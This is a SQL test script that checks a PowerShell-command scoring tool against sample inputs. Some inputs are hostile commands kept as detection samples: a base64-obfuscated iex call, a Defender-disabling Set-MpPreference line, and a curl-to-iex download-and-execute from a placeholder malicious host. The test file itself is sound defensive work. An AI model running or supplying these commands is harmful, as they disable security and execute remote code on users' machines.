-- Test script to demonstrate concurrent detection of common cmdlets and suspicious patterns
-- This shows how a command can be both legitimate (common cmdlet) AND suspicious

-- Test 1: Pure common cmdlet (should only show cmdlet detection)
SELECT 'Test 1: Pure common cmdlet (Get-Process)' as test_name;
SELECT * FROM analyze_powershell_command_comprehensive('Get-Process notepad');

-- Test 2: Common cmdlet with suspicious pattern (should show both)
SELECT 'Test 2: Common cmdlet + suspicious (iex with base64)' as test_name;
SELECT * FROM analyze_powershell_command_comprehensive('iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cG93ZXJzaGVsbC5leGUgLWVuYyBXR0ZoYUdVZ2FHbGtaR1Z1SUVOdmJXMWhibVE9")))');

-- Test 3: Multiple common cmdlets
SELECT 'Test 3: Multiple common cmdlets (ls, cat, echo)' as test_name;
SELECT * FROM analyze_powershell_command_comprehensive('ls C:\temp | cat file.txt | echo "done"');

-- Test 4: Suspicious pattern without common cmdlets
SELECT 'Test 4: Suspicious without common cmdlets (DisableRealtimeMonitoring)' as test_name;
SELECT * FROM analyze_powershell_command_comprehensive('Set-MpPreference -DisableRealtimeMonitoring $true');

-- Test 5: Common cmdlet alias with web request (both common and suspicious)
SELECT 'Test 5: Common alias + web request (curl)' as test_name;
SELECT * FROM analyze_powershell_command_comprehensive('curl https://malicious-site.com/payload.ps1 | iex');

-- Test 6: Check individual cmdlet
SELECT 'Test 6: Individual cmdlet check for "iex"' as test_name;
SELECT * FROM check_common_cmdlet('iex');

-- Test 7: Show some sample cmdlets from the database
SELECT 'Test 7: Sample cmdlets in database' as test_name;
SELECT alias, cmdlet_name, basescore, description 
FROM powershell_cmdlets 
WHERE alias IN ('iex', 'curl', 'ls', 'cat', 'echo', 'ps') 
ORDER BY alias;

-- Test 8: Mixed scenario - legitimate admin task that could look suspicious
SELECT 'Test 8: Legitimate admin task with suspicious appearance' as test_name;
SELECT * FROM analyze_powershell_command_comprehensive('Get-Process | Where-Object {$_.ProcessName -eq "notepad"} | Stop-Process; iex "Write-Host Security-Check-Complete"');
